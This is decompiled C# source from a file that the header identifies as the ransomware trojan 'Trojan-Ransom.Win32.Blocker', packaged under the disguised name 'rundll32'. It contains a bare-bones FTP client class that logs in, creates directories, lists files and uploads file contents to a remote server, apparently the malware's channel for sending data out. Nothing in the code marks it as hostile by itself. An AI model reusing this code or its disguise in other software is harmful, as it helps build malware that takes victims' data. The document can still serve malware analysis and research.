// Decompiled with JetBrains decompiler
// Type: rundll32.ftp
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace rundll32
{
  internal class ftp
  {
    public string host;
    public int port;
    public string user;
    public string pass;
    public TcpClient _tcp;
    public Socket _data;
    private StreamWriter _sw;
    private StreamReader _sr;
    private string result;
    private string bucket;
    private string tempFileContents;
    private Thread connThread;
    private Thread dataThread;

    public ftp(string host, int port, string user, string pass)
    {
      this.host = host;
      this.port = port;
      this.user = user;
      this.pass = pass;
    }

    public void close()
    {
      try
      {
        this.connThread.Abort();
      }
      catch
      {
      }
      try
      {
        this.dataThread.Abort();
      }
      catch
      {
      }
      try
      {
        this._tcp.Close();
      }
      catch
      {
      }
      try
      {
        this._data.Close();
      }
      catch
      {
      }
    }

    public void connect()
    {
      this._tcp = new TcpClient();
      this._tcp.Connect(this.host, this.port);
      this._sw = new StreamWriter((Stream) this._tcp.GetStream());
      this._sr = new StreamReader((Stream) this._tcp.GetStream());
      this.connThread = new Thread(new ThreadStart(this.loopT));
      this.connThread.Start();
      this._sw.AutoFlush = true;
      this._sw.WriteLine("USER " + this.user);
      this._sw.WriteLine("PASS " + this.pass);
    }

    public bool changeDir(string path)
    {
      this.bucket = (string) null;
      this._sw.WriteLine("CWD " + path);
      do
        ;
      while (this.bucket == null);
      return this.bucket.StartsWith("250");
    }

    public bool makeDir(string dir)
    {
      this.bucket = (string) null;
      this._sw.WriteLine("MKD " + dir);
      do
        ;
      while (this.bucket == null);
      return this.bucket.StartsWith("250");
    }

    public void writeFile(string fileName, string contents)
    {
      this.tempFileContents = contents;
      this.bucket = (string) null;
      this._sw.WriteLine("PASV");
      do
        ;
      while (this._data == null);
      this.bucket = (string) null;
      this._sw.WriteLine("TYPE I");
      do
        ;
      while (this._data == null);
      this._sw.WriteLine("STOR " + fileName);
      do
        ;
      while (this.bucket == null);
      this.dataThread = new Thread(new ThreadStart(this.loopUpload));
      this.dataThread.Start();
    }

    public string[] getFileFolders()
    {
      this.bucket = (string) null;
      this._sw.WriteLine("PASV");
      do
        ;
      while (this._data == null);
      this.dataThread = new Thread(new ThreadStart(this.loopFolders));
      this.dataThread.Start();
      this._sw.WriteLine("LIST");
      do
        ;
      while (this.result == null);
      string result = this.result;
      this.result = (string) null;
      string[] strArray1 = result.Split('\n');
      List<string> stringList = new List<string>();
      foreach (string str in strArray1)
      {
        char[] chArray = new char[1]{ ' ' };
        string[] strArray2 = str.Split(chArray);
        if (strArray2.Length > 4)
          stringList.Add(strArray2[strArray2.Length - 1].Replace("\r", ""));
      }
      return stringList.ToArray();
    }

    private void loopT()
    {
      try
      {
        while (true)
        {
          string str = this._sr.ReadLine();
          if (str != null)
          {
            Console.WriteLine(str);
            this.bucket = str;
            try
            {
              if (str.StartsWith("227"))
              {
                this._data = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                string[] strArray = str.Split('(')[1].Split(')')[0].Split(',');
                this._data.Connect(string.Format("{0}.{1}.{2}.{3}", (object) strArray[0], (object) strArray[1], (object) strArray[2], (object) strArray[3]), (int.Parse(strArray[4]) << 8) + int.Parse(strArray[5]));
              }
            }
            catch
            {
            }
          }
          else
            break;
        }
        throw new Exception();
      }
      catch
      {
      }
    }

    private void loopUpload()
    {
      try
      {
        this._data.Send(Encoding.ASCII.GetBytes(this.tempFileContents));
        this._data.Close();
      }
      catch
      {
      }
    }

    private void loopFolders()
    {
      try
      {
        int num = 0;
        while (this._data.Available < 1)
        {
          Thread.Sleep(50);
          ++num;
          if (num == 50)
          {
            this.result = "";
            break;
          }
        }
        byte[] numArray = new byte[512];
        string str = "";
        while (this._data.Available > 0)
        {
          long count = (long) this._data.Receive(numArray, numArray.Length, SocketFlags.None);
          str += Encoding.ASCII.GetString(numArray, 0, (int) count);
        }
        this.result = str;
        this._data.Close();
        this._data = (Socket) null;
      }
      catch
      {
      }
    }
  }
}
